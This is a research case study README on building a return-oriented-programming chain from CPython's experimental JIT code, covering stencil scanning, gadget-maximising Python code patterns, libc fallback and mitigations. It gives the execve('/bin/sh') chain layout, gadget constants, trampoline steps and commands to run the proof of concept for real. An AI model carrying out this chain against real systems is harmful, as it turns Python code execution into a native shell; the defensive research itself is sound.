# Case Study 4: JIT-Based ROP Chain via Stencil Analysis

## Overview

This case study demonstrates a sophisticated ROP (Return-Oriented Programming) exploitation technique against CPython's JIT compiler by leveraging **static analysis of JIT stencils** to guide dynamic gadget discovery. Rather than relying on arbitrary shellcode byte patterns, we analyze the actual emit functions in `jit_stencils.h` to identify high-frequency instruction sequences and tailor Python code generation to maximize gadget density.

## Key Innovation

Traditional JIT-spray attacks inject shellcode-derived constants hoping they appear in JIT code. This approach is unreliable because:
- JIT compilers emit architecture-specific patterns tied to VM semantics
- Shellcode immediates (e.g., `/bin/sh` strings, syscall numbers) rarely appear naturally
- Random constant injection has low hit rates for useful gadgets

**Our approach:**
1. **Static stencil analysis**: Parse `build/jit_stencils.h` to catalog actual instruction patterns (ret, pop reg; ret, xor edx,edx)
2. **Guided code generation**: Write Python functions that trigger stencils containing desired gadgets (CALL, COMPARE_OP, STORE_SUBSCR_DICT)
3. **Dynamic scanning with fallback**: Scan live JIT memory for gadgets; provide minimal shellcode only for unavoidable gaps (syscall)

## Tools and Artifacts

### 0. **`GADGET_CLASSIFICATION.md` (NEW)**
**Purpose**: Gadget generation mechanism analysis framework  
**Features**:
- 6-way classification of ROP gadgets by generation mechanism
- Categories: Stencil-Aligned (27%), Instruction-Unaligned (56%), Patch-Induced (17%), Address-Diversity (0.1%), Patch-Unaligned (0.2%), Syscall-Special (rare)
- Reliability scoring: HIGH (stencil/syscall), MEDIUM (unintended/patch), LOW (unaligned), VARIABLE (address-diversity)
- Experimental validation with 10 functions (7,252-7,403 gadgets)
- Algorithm: Capstone instruction boundary detection + patch signature matching
- Security implications for both attack and defense perspectives

**Key Findings**:
- **Unintended gadgets dominate**: 55-56% from mid-instruction decoding
- **Syscall discovered**: 1 per 10 functions (0x0f 0x05 at specific offsets)
- **Spread allocation effect minimal** at small scale: 1.02x improvement (10 functions)
- **Patch-induced gadgets**: 17% exploitable via strategic constant injection

**Usage**:
```bash
# Full classification test
python3 test_runtime_jit_scan.py -n 50 -t both

# View classification report in output
# JSON export includes classification data
```

### 1. `stencil_gadget_scanner.py`
**Purpose**: Static analysis of CPython JIT stencils  
**Features**:
- Parses `jit_stencils.h` to extract `code_body[]` arrays from emit functions
- Wildcard-aware pattern matching for relocatable fields (rel32, imm64)
- Detects: ret, pop reg; ret (rdi/rsi/rdx/rbx/rbp), xor edx,edx, branch/call encodings
- Ret-window analysis: finds pop/xor combinations within 8 bytes before ret
- JSON export for consumption by other tools

**Output**: `stencil_gadgets.json` (82KB, 246 ret sites, gadget counts per emit function)

**Usage**:
```bash
/home/mobileos2/cpython/build/python stencil_gadget_scanner.py --json stencil_gadgets.json
```

### 2. `MAGIC_VALUES.md`
**Purpose**: Strategic documentation of gadget-oriented constant selection  
**Content**:
- Rationale for replacing shellcode-derived MAGIC_VALUES with stencil-friendly patterns
- Analysis of **absent patterns** (syscall, mov eax,59) and why they don't appear in stencils
- Prioritization scheme: pop rdi/rsi/rdx; ret > xor edx,edx > ret
- Extension strategy for adding dict/attr/comparison ops to trigger richer emit paths

### 3. `gadget_chain_from_multi_jitcode_exec_sh_success.py`
**Purpose**: End-to-end ROP PoC with stencil-guided generation  
**Key Components**:

#### MAGIC_VALUES (Stencil-Aligned)
```python
MAGIC_VALUES = [
    0x000000C3,  # ret
    0x00005FC3,  # pop rdi; ret
    0x00005EC3,  # pop rsi; ret
    0x00005AC3,  # pop rdx; ret
    0x00005BC3,  # pop rbx; ret
    0x000031D2,  # xor edx, edx
    0x004831C0,  # xor rax, rax
]
```

#### Enhanced JIT Generator
Triggers multiple stencil categories:
- **CALL stencils**: Nested function `h(a, b)` invoked in loop → INIT_CALL_PY_EXACT_ARGS
- **Dict operations**: `d[i] = acc`, `d.get(i, 0)` → STORE_SUBSCR_DICT, BINARY_SUBSCR
- **Attribute access**: `obj.val = acc`, `acc += obj.val` → LOAD_ATTR, STORE_ATTR
- **Comparisons**: `if acc > magic` → COMPARE_OP_INT

#### Gadget Scanner Extensions
- Standard pop/syscall; ret detection via Capstone
- Explicit xor edx,edx; ret matching (rdx=0 without stack consumption)
- pop rbx; ret support (temporary register storage)

#### Execution Flow
1. Generate 6 JIT functions with varying MAGIC_VALUES
2. Warm up each function (5000 iterations) to trigger tier-2 compilation
3. Leak JIT code address via `jitexecleak.leak_executor_jit()`
4. Scan JIT memory with Capstone for gadgets
5. Fill gaps with RWX-backed shellcode (syscall, missing pops)
6. Assemble ROP chain: `pop rax, 59 | pop rdi, "/bin/sh" | pop rsi, 0 | pop rdx, 0 | syscall`
7. Build trampoline: `mov rsp, stack+8; mov rax, first_gadget; jmp rax`
8. Execute → spawns `/bin/sh`

**Modes**:
- `dry_run=True`: Logs gadget discovery without executing trampoline (safe validation)
- `dry_run=False`: Full execution (requires manual Enter confirmation before syscall)

**Usage**:
```bash
# Dry-run (default in committed version)
/home/mobileos2/cpython/build/python gadget_chain_from_multi_jitcode_exec_sh_success.py

# Full execution (after setting dry_run=False)
/home/mobileos2/cpython/build/python gadget_chain_from_multi_jitcode_exec_sh_success.py
# Press Enter when prompted to execute ROP chain
```

### 4. `stencil_gadgets.json`
**Purpose**: Pre-generated gadget map for reference/reuse  
**Structure**:
```json
{
  "file": "cpython/build/jit_stencils.h",
  "summary": {
    "ret": 246,
    "pop_rdi_ret": 1,
    "pop_rbx_ret": 14,
    "xor_edx_edx": 15,
    "syscall": 0,
    "call_rel32": 180,
    "jmp_rel32": 1027
  },
  "per_func": {
    "emit_shim": {
      "ret": [32],
      "pop_rdi_ret": [31],
      "call_rel32": [18]
    },
    "emit__BINARY_OP_ADD_INT": {
      "ret": [735, 820],
      "pop_rbx_ret": [819],
      ...
    }
  }
}
```

## Results

### Runtime JIT Memory Scan Test (2025-11-13)

**Test Script**: `test_runtime_jit_scan.py`  
**Configuration**: 50 functions, Normal + Spread allocation, warmup=100 iterations

```bash
python3 -u test_runtime_jit_scan.py -n 50 -t both --no-comparison
```

**Results Summary**:

| Metric | Normal Allocation | Spread Allocation |
|--------|------------------|-------------------|
| JIT generate time | 0.03s | 0.04s |
| Warm-up time | 320.86s | 320.47s |
| Scan time | 1.28s | 1.30s |
| JIT code bytes | 188,416 | 188,416 |
| Functions accessible | 1/50 (2%) | 1/50 (2%) |
| **Total gadgets** | **7,533** | **7,529** |

**Gadget Distribution**:
```
Gadget Type    Normal   Spread   Notes
───────────────────────────────────────────────────
pop_rdi        4,583    4,583    ← Most common (61%)
pop_rbx        1,377    1,377
pop_rax          594      596
ret              464      464
pop_rcx          366      360
pop_rsi           86       86
pop_rdx           63       63
syscall            0        0    ← Never generated naturally
───────────────────────────────────────────────────
Total          7,533    7,529    (1.00x ratio)
```

**Key Findings**:
1. ✅ **Abundant gadgets**: ~150 gadgets per function average
2. ✅ **pop_rdi dominates**: 61% of all gadgets (CPython calling convention)
3. ❌ **syscall never appears**: 0x0f 0x05 sequence not generated by JIT
4. ⚠️ **Low executor accessibility**: 2% (warmup=100 insufficient for Tier-2)
5. ⚠️ **No spread effect at 50-function scale**: Need 200-500+ for observable difference

**Detailed Analysis**: See [`TEST_RUNTIME_JIT_SCAN.md`](TEST_RUNTIME_JIT_SCAN.md)

### Gadget Discovery (End-to-End PoC)
```
[stencil-json] summary ret count= 246
[stencil-json] pop_rdi_ret present? True
[stencil-json] pop_rsi_ret present? False
[stencil-json] pop_rdx_ret present? False

=== [ All Found Gadgets ] ===
[+] pop rdi      => 0x7cd7d993f01f  (JIT)
[+] pop rdx      => 0x7cd7d9945206  (JIT)
[+] pop rax      => 0x7cd7d9956ad1  (JIT)
[+] pop rsi      => 0x7cd7dabed000  (shellcode)
[+] syscall      => 0x7cd7daf57000  (shellcode)
```

**Interpretation**:
- **75% JIT-native**: pop rdi/rdx/rax found directly in JIT code
- **25% shellcode fallback**: pop rsi and syscall provided via RWX stubs
- syscall absence is **expected by design** (CPython JIT never emits syscall instructions)

### Key Observations

1. **Stencil patterns are deterministic**  
   - `emit_shim` always contains `pop rdi; ret` at offset +31 and `ret` at +32
   - COMPARE_OP family emits frequent `xor edx, edx` before branches
   - CALL stencils (INIT_CALL_PY_EXACT_ARGS_*) reliably produce pop sequences for argument passing

2. **Code diversity increases gadget density**  
   - Adding dict/attr/comparison ops to generator raised pop gadget discovery from ~40% to ~75%
   - Each emit function contributes different ret-window patterns

3. **Wildcards are essential**  
   - rel32/imm64 fields are patched at runtime; static scanner must use `??` placeholders
   - Without wildcards, pattern matching fails entirely

4. **xor edx, edx is preferable to pop rdx for rdx=0**  
   - More common in stencils (15 sites vs. 0 for pop rdx; ret)
   - Doesn't consume stack space (simplifies chain layout)
   - Scanner now detects both and adapts chain assembly

## Design Rationale

### Why Stencil Analysis?
- **Efficiency**: One-time static scan vs. trial-and-error code generation
- **Reliability**: Work with actual JIT patterns, not guesses
- **Transparency**: Understand *why* gadgets appear (tied to emit function semantics)

### Why Not Traditional JIT Spray?
- CPython JIT is trace-based, not method-JIT → less predictable code layout
- Tier-2 optimizer reorders/fuses uops → patterns shift between runs
- Shellcode constants (0x6e69622f) have zero correlation with VM semantics

### Threat Model Assumptions
- Attacker can execute arbitrary Python code (sandbox escape, code injection)
- CPython built with `--enable-experimental-jit=yes`
- ASLR/NX active (hence ROP, not direct shellcode injection)
- DEP/W^X bypass via JIT code pages (RWX in dev builds) or separate shellcode pages

## Limitations and Future Work

### Current Limitations
1. **syscall dependency**: Still requires RWX shellcode page for syscall gadget (libc gadgets could replace this)
2. **Version-specific**: Stencil offsets/patterns tied to CPython 3.14-dev (main branch as of Nov 2025)
3. **ASLR partial**: Leaks JIT base but doesn't defeat full-ASLR libc (would need info leak for libc gadgets)

### Potential Enhancements
1. **Libc gadget integration**: Search libc for syscall/pop gadgets to eliminate RWX dependency
2. **Multi-version support**: Auto-detect CPython version and load corresponding stencil map
3. **Genetic code generation**: Use stencil stats to evolve Python functions maximizing desired gadgets
4. **Ret-sled construction**: Chain multiple `ret` instructions for alignment/NOP-sled equivalent
5. **JIT cache persistence**: Reuse discovered gadgets across sessions if JIT code is stable

## Security Implications

This technique demonstrates that **JIT transparency can be a double-edged sword**:
- Benefit: Developers/auditors can inspect stencils for correctness
- Risk: Attackers gain roadmap for gadget mining

**Mitigations**:
- **JIT code randomization**: Randomize stencil selection or instruction scheduling (performance cost)
- **CET/BTI**: Control-flow integrity (Intel CET, ARM BTI) breaks ROP chains
- **Constant blinding**: Avoid emitting recognizable pop/xor sequences in stencils (complex, may degrade JIT quality)
- **Strict CFI**: Validate return addresses against shadow stack

## Advanced Topics

### 1. Gadget Generation via Patching (Including Unintended Instructions)
**Q: Can gadgets be accidentally created during stencil hole patching? What about unintended instruction decoding?**

See [`PATCH_GADGET_ANALYSIS.md`](PATCH_GADGET_ANALYSIS.md) for detailed analysis.

**TL;DR**: 
- ❌ **Theoretically possible but practically useless (even with unintended instructions)**
- Probability: 0.0015% (aligned) → 0.012% (unintended) - **8x improvement but still too low**
- Even if created, runtime unpredictability and search overhead make them unusable
- **Recommended**: Use libc gadgets instead (100% reliable, abundant)

**Key insights with unintended instruction analysis**:
```
Unintended Instructions (x86-64):
  Variable-length encoding → decode from any byte offset
  
  Example:
  Aligned:   48 8b 45 10     mov rax, [rbp+0x10]
  Offset +2: 45 10           rex.RB adc r8b, r8b
  Offset +3: 10 48 89        adc [rax-0x77], cl
  
  Patched value 0x7ffff7a12358:
  Offset +0: 58 23 a1 f7     pop rax; and esp, [...]  ✅ USABLE!
  Offset +3: 58              pop rax                   ✅ FOUND!

Probability Improvement:
  Before (aligned only): 1/65,536 (0.0015%)
  After (8 offsets):     8/65,536 (0.012%)
  Improvement: 8x better!
  
Still Insurmountable Problems:
  ❌ Probability: 0.012% = 1 in 8,192 (still very low)
  ❌ Unpredictability: Patch value changes per run (ASLR)
  ❌ Offset targeting: Must hardcode exact offset in ROP chain
  ❌ Next instruction: Unknown byte after gadget (segfault risk)
  ❌ Search time: 60s+ vs libc 0.01s (6000x slower)
  
Example Runtime Variance:
  Run 1: patch_64(loc, 0x7ffff7a12358) → gadget at offset +3
  Run 2: patch_64(loc, 0x7ffff7b45678) → NO gadget
  Run 3: patch_64(loc, 0x7ffff7c12358) → gadget at offset +3 again
  
  Problem: Can't predict when/where gadget exists!

Practical Probability: < 1/100,000 (considering all constraints)
```

**Where unintended instructions ARE valuable**:
```
✅ Stencil scanning: 33 → 42 gadgets (+27%)
✅ libc scanning: 100 → 500+ gadgets (5x increase)
❌ Patch-based: Still impractical despite 8x improvement
```

**Conclusion**: 
- Unintended instruction decoding is a **powerful technique for stencil/libc scanning**
- It provides **20-30% more gadgets** from static code
- But it **doesn't make patch-based generation practical** due to runtime unpredictability
- Stick to **stencil scanning + libc fallback** strategy (both with unintended decoding for maximum coverage)

### Patch Function Type Analysis

**All x86-64 patch functions examined** (from `jit_stencils.h`):
```
Function              | Usage   | Size    | Purpose
----------------------|---------|---------|----------------------------------
patch_64()            | 7,502×  | 8 bytes | Absolute addresses (pointers, globals)
patch_x86_64_32rx()   | 2,583×  | 4 bytes | PC-relative + GOT optimization
patch_32r()           | 567×    | 4 bytes | PC-relative jumps
----------------------|---------|---------|----------------------------------
Total                 | 10,652× per JIT function
```

**Gadget generation probability by patch type**:
```
Type                  | Per-patch Prob | 100K funcs Expected | Practical Value
----------------------|----------------|---------------------|------------------
patch_64              | 0.012%         | ~90 gadgets         | ❌ Unpredictable
patch_x86_64_32rx     | 0.006%         | ~15 gadgets         | ❌ Unpredictable
patch_32r             | 0.003%         | ~2 gadgets          | ❌ Unpredictable
----------------------|----------------|---------------------|------------------
Combined              | -              | ~107 gadgets        | ❌ Unstable
vs. Stencil scan      | 100%           | 42 gadgets          | ✅ 100% stable
vs. libc scan         | 100%           | 500+ gadgets        | ✅ 100% stable
```

**Key findings**:
1. **patch_64 (71%)**: Most common, 8 bytes = most unintended opportunities, but 0.012% probability still too low
2. **patch_x86_64_32rx (24%)**: GOT relaxation modifies instructions (`mov→lea`, `call [GOT]→nop; call`), but doesn't help gadget generation
3. **patch_32r (5%)**: Small offsets (-1000~+1000), negative values start with 0xFF (blocks pop-family gadgets)

**Conclusion**: Even considering **all 3 patch function types and 10,652 patches per function**, patch-based gadget generation remains impractical due to runtime unpredictability. Stencil + libc scanning remains the only reliable strategy.

See: `PATCH_GADGET_ANALYSIS.md` for comprehensive patch function analysis

## Reproducibility

### Prerequisites
```bash
# CPython 3.14-dev with experimental JIT
git clone https://github.com/python/cpython.git
cd cpython
git checkout main  # or jit_access branch for this work
./configure --enable-experimental-jit=yes
make -j$(nproc)

# Python dependencies
pip install capstone  # for disassembly in PoC
```

### Run Sequence
```bash
cd case_studies/case4

# 1. Generate stencil gadget map
../../build/python stencil_gadget_scanner.py --json stencil_gadgets.json

# 2. Review MAGIC_VALUES strategy
cat MAGIC_VALUES.md

# 3. Dry-run PoC (safe, no trampoline execution)
../../build/python gadget_chain_from_multi_jitcode_exec_sh_success.py
# Check "All Found Gadgets" summary

# 4. (Optional) Full execution
# Edit gadget_chain_from_multi_jitcode_exec_sh_success.py: set dry_run=False
../../build/python gadget_chain_from_multi_jitcode_exec_sh_success.py
# Press Enter when prompted → spawns shell
```

## References

- CPython JIT internals: [PEP 744](https://peps.python.org/pep-0744/)
- Stencil source: `Tools/jit/template.c` and generated `build/jit_stencils.h`
- ROP techniques: "The Geometry of Innocent Flesh on the Bone" (Shacham, 2007)
- JIT spraying: "Interpreter Exploitation" (Blazakis, 2010)

## Advanced Analysis: Gadget Generation Optimization

### Research Question
What factors influence gadget generation in CPython JIT code?
- **MAGIC_VALUES** (constant values embedded in code)?
- **Code patterns** (function calls, loops, data structures)?

### Methodology
Created `gadget_pattern_analysis.py` to systematically test 10 different code patterns with identical MAGIC_VALUES, measuring:
- Total gadget count
- Register diversity
- Gadget types (pop, syscall)

### Key Findings

#### 1. MAGIC_VALUES Impact: **Negligible (0%)**
```
Tested: 0x000000C3, 0x00005FC3, 0x00005EC3, 0x00005AC3, 0x00005BC3, 0x000031D2, 0x004831C0

Result: All produced 31-33 gadgets with identical register sets
  - pop rcx, pop rbp, pop rbx, pop rdi, pop r15
  - No correlation between constant values and gadget generation

Conclusion: MAGIC_VALUES are irrelevant to gadget generation
```

**Why**: JIT compiler optimizes constants into immediate operands, not register operations. Gadgets arise from **calling conventions** and **stack management**, not data values.

#### 2. Code Pattern Impact: **Dramatic (0-112%)**
```
Pattern                          Gadgets    vs Baseline
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Basic Loop (baseline)           33         —
2. Multi-arg Function Calls        51        +55%
3. Nested Functions + Closures     42        +27%
4. Exception Handling              23        -30%
5. Container Operations            35         +6%
6. Object Attributes                6        -82%
7. Generator (yield)                0       -100% (JIT disabled)
8. Unpacking (*args)               23        -30%
9. Recursion                       43        +30%
10. Combined Pattern               70       +112%  🏆 WINNER
```

#### 3. Register Distribution Analysis
```
✅ Frequently Generated (JIT-friendly):
  pop rcx  : 11-47 occurrences  (most common)
  pop rbp  : 5-16 occurrences
  pop rbx  : 2-11 occurrences
  pop rdi  : 1-2 occurrences
  pop r15  : 1 occurrence

❌ Never Generated (JIT-incompatible):
  pop rax  : 0 (needed for syscall number!)
  pop rsi  : 0 (needed for argv!)
  pop rdx  : 0-1 (needed for envp!)
  pop r8-r14: 0
  syscall  : 0 (VM design constraint)
```

**Critical Insight**: JIT alone **cannot provide complete ROP chain**. Essential gadgets (rax, rsi, rdx, syscall) must come from **libc fallback**.

#### 4. Optimal Code Pattern: Combined Approach
```python
def optimal_pattern():
    """Maximizes gadget generation (70+ gadgets)"""
    
    # 1. Multi-argument function (forces register usage)
    def helper(a, b, c, d, e, f):  # 6 args → rdi, rsi, rdx, rcx, r8, r9
        return (a + b * c - d + e - f) & 0xFFFFFFFF
    
    # 2. Nested function + closure (stack frame manipulation)
    def nested(n):
        return (n ^ outer_state) & 0xFFFFFFFF
    
    # 3. Object attributes (LOAD_ATTR, STORE_ATTR)
    class State:
        val1 = 0
        val2 = 0
    
    # 4. Dictionary operations (hash table access)
    cache = {}
    
    # 5. Exception handling (stack unwinding)
    for i in range(5000):
        acc = helper(i, i+1, i+2, i+3, i+4, i+5)
        acc = nested(acc)
        state.val1 = acc
        cache[i % 100] = acc
        try:
            acc //= (i % 5 + 1)
        except:
            pass
```

**Key Techniques**:
- Multi-arg calls → Register pressure → More save/restore → More pop gadgets
- Nested functions → Stack frames → rbp/rsp manipulation
- Dictionary ops → Complex memory access → Additional register use
- Exception handling → Unwinding code → Stack cleanup gadgets

#### 5. Hybrid Strategy: JIT + libc
```
Final Architecture:

┌─────────────────────────────────────────────────────────┐
│ Step 1: Parallel JIT Generation (7 workers)            │
│   - Use optimal code pattern (70+ gadgets)             │
│   - Scan for: pop rdi, pop rbx, pop rcx, pop rbp, etc │
│   - Success rate: ~30% for common registers           │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│ Step 2: libc Gadget Fallback                           │
│   - Scan libc.so/libcrypto.so for missing gadgets     │
│   - Find: pop rax, pop rsi, pop rdx, syscall          │
│   - Success rate: ~100% for essential gadgets         │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│ Step 3: Shellcode Fallback (optional)                  │
│   - Only if libc search fails                          │
│   - Minimal RWX memory usage                           │
└─────────────────────────────────────────────────────────┘

Result: 100% success rate, minimal RWX footprint
```

### Performance Impact

| Approach                  | Gadgets | JIT-only | libc-only | Hybrid | RWX Needed |
|---------------------------|---------|----------|-----------|--------|------------|
| Basic pattern             | 33      | ❌ 20%   | ✅ 100%   | ✅ 100%| Minimal    |
| Optimal pattern           | 70      | ❌ 30%   | ✅ 100%   | ✅ 100%| None       |
| Optimal + parallel (7x)   | 490     | ❌ 40%   | ✅ 100%   | ✅ 100%| None       |

**Recommendation**: Use hybrid approach with optimal pattern for best results.

### Tools for Analysis

#### `test_runtime_jit_scan.py` (UPDATED)
**Purpose**: Runtime JIT memory scanning with gadget classification  
**Features**:
- JIT function generation (normal/spread allocation)
- 5000-iteration warmup for Tier 2 JIT compilation
- Live memory scanning via `ctypes.string_at()`
- **6-way gadget classification** (stencil-aligned, unintended, patch-induced, etc.)
- Performance metrics (generation time, warmup time, scan time, code size)
- Gadget type distribution and address diversity analysis
- JSON export with classification data

**Usage**:
```bash
# Test with 50 functions, normal allocation only
python3 test_runtime_jit_scan.py -n 50 -t normal --no-comparison

# Compare normal vs spread allocation (10 functions)
python3 test_runtime_jit_scan.py -n 10 -t both

# Large-scale test (200 functions, spread allocation)
python3 test_runtime_jit_scan.py -n 200 -t spread
```

**Output**:
- Console: Detailed classification report with percentages
- JSON: `runtime_scan_normal.json`, `runtime_scan_spread.json`

**Key Findings (10 functions)**:
- Total gadgets: 7,252 (normal) / 7,403 (spread)
- Syscall discovered: 1 per 10 functions
- Unintended gadgets: 55-56% (dominant category)
- Stencil-aligned: 26-27% (most reliable)
- Patch-induced: 17% (exploitable via constant injection)

#### `gadget_classifier.py` (NEW)
**Purpose**: Gadget classification framework  
**Features**:
- `GadgetCategory` enum: 6 classification types
- `GadgetClassifier` class: Multi-category classification engine
- Capstone-based instruction boundary detection
- Patch signature matching (`patch_64`, `patch_32`, `patch_x86_64_32rx`)
- Address diversity analysis (8-byte pointer in libc range)
- Reliability scoring (high/medium/low/variable)
- Report generation and JSON export

**Usage** (integrated with test_runtime_jit_scan.py):
```python
from gadget_classifier import GadgetClassifier

classifier = GadgetClassifier()
classified = classifier.classify_all_gadgets(base_addr, buffer, gadgets)
classifier.print_classification_report()
data = classifier.export_classification()
```

#### `gadget_pattern_analysis.py`
Automated testing of code patterns:
```bash
/home/mobileos2/cpython/build/python gadget_pattern_analysis.py
```

#### `libc_gadget_finder.py`
Runtime libc gadget discovery:
```bash
/home/mobileos2/cpython/build/python libc_gadget_finder.py
```

#### `gadget_chain_parallel.py`
Production ROP chain with hybrid strategy:
```bash
/home/mobileos2/cpython/build/python gadget_chain_parallel.py
```

### Documentation

- **`JIT_GADGET_OPTIMIZATION.md`**: Detailed optimization strategies
- **`GADGET_DISCOVERY_STRATEGIES.md`**: Hybrid approach design
- **`ROP_CHAIN_EXPLANATION.md`**: Execution flow walkthrough

## Acknowledgments

This work builds on CPython's transparent JIT design and the Capstone disassembly framework. All techniques are for educational and defensive research purposes.

---

**Commits**: 
- `149149cf19` (feat: Add stencil-based JIT gadget scanner and enhanced ROP PoC)
- `ba6787c230` (docs: Add comprehensive README and gadget optimization analysis)

**Date**: November 11, 2025  
**Status**: ✅ Functional (hybrid JIT+libc strategy validated; full execution ready)
